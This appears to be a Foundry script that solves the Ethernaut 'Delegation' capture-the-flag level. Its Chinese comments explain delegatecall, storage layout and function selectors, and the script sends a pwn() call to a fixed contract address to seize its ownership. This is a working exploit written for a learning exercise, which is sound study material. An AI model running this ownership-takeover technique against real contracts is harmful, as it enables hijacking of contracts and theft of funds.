// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Delegation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// target 取得合約所有權
// notes
// delegatecall, 本地合約調用其他合約的一種 low-level 方法
// delegatecall 使用時要注意兩個合約之間的狀態變數數量, 型態, 順序是否都相同
// function selector = 對 function signature 做 hash(keccak-256) 後取前四個 bytes
// abi.encode 可以將 input 參數按照一定的規則轉換成 bytes 格式, 經 ABI 編碼後的程式才能在合約之間進行互動, abi.encodeWithSignature 類似, 只是多一個 function signature 參數

contract Lev6Sol is Script {
    Delegation public lev6Instance =
        Delegation(payable(0x088Ed0A1B5570b2F3AC2fF28Dc5f3E0F9d391C9D));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // console.log("owner before:", lev6Instance.owner());
        address(lev6Instance).call(abi.encodeWithSignature("pwn()"));
        // console.log("owner after:", lev6Instance.owner());
        // console.log("my address:", vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}
